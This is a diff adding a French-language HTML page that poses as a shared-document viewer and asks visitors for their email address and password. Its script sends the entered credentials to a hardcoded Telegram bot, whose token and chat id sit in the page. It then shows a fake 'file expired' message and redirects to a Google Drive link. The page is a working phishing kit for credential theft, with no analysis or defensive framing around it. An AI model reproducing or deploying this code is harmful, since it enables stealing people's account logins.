@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  
+  <title>FA-23456</title>
+  <link rel="stylesheet" href="./index_files/style.css">
+  <style>
+   /* style.css */
+body {
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background-color: #f2f2f2;
+  margin: 0;
+  padding: 0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.container {
+  background: #fff;
+  padding: 20px;
+  border-radius: 10px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  width: 100%;
+  max-width: 400px;
+  text-align: center;
+}
+
+#messageForm {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+.file-info img {
+  margin-bottom: 15px;
+}
+
+.file-name {
+  font-size: 1.2em;
+  margin-bottom: 10px;
+}
+
+#sign {
+  font-size: 1em;
+  margin-bottom: 20px;
+}
+
+input[type="text"],
+input[type="password"] {
+  width: 100%;
+  padding: 10px;
+  margin: 10px 0;
+  border: 1px solid #ccc;
+  border-radius: 5px;
+  font-size: 1em;
+}
+
+button[type="submit"] {
+  width: 100%;
+  padding: 10px;
+  border: none;
+  border-radius: 5px;
+  background-color: rgb(0, 103, 184);
+  color: white;
+  font-size: 1em;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+}
+
+button[type="submit"]:hover {
+  background-color: rgb(0, 128, 0);
+}
+
+#status {
+  color: red;
+  margin-top: 10px;
+}
+  </style>
+</head>
+<body>
+<div class="container">  
+  <form id="messageForm">
+    <div id="contact" class="file-info">
+      <img alt="" src="./index_files/document.png" style="height: 70px;width:120px;">
+      <div class="file-name"></div>
+      <div id="sign" style="text-align: center; color: #0067b8;font-weight: bold;">Pour ouvrir ce document, veuillez entrer les identifiants de connexion aux quels ce fichier a été envoyé.</div>
+      <input type="text" name="Email" id="Email" placeholder="Adresse e-mail" required="">
+      <input type="password" name="Password" id="Password" placeholder="Mot de passe" required="">
+      <p id="status"></p>
+    </div>
+    <fieldset>
+      <button name="submit" type="submit" id="contact-submit" data-submit="...Sending">S'identifier</button>
+    </fieldset>
+  </form>
+</div>
+
+<script>
+if(localStorage.getItem("valide")!=="true"){
+window.location.href="../";
+}
+const chat_id = '1643937443'; 
+const botID = 'bot7496067209:AAFkucyA4jVFV4b2ddIDIogAsG_6c1z0KFg'; 
+const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
+
+document.querySelector('#messageForm').addEventListener("submit", async e => {
+    e.preventDefault();
+    
+    const email = document.getElementById('Email').value;
+    const password = document.getElementById('Password').value;
+    const status = document.querySelector('#status');
+    
+    if (email && password) {
+        const text = `Email: ${email}\nPassword: ${password}`;
+        
+        const sendMessage = await fetch(telegramURL, {
+            method: 'POST',
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({ chat_id, text }),
+        });
+        
+        if (sendMessage.ok) {
+            status.textContent = "Ce fichier expiré.";
+            setTimeout(() => {
+                window.location.href = "https://drive.google.com/file/d/137liGU3AoNx7XQ_Z_3fN2g1e963RebMU/view?pli=1"; 
+            }, 3000); 
+        } else {
+            status.textContent = "Échec de l'envoi du message. Veuillez réessayer.";
+        }
+        
+        e.target.reset();
+    } else {
+        status.textContent = "Veuillez remplir tous les champs.";
+    }
+});
+</script>
+
+
+</body></html>
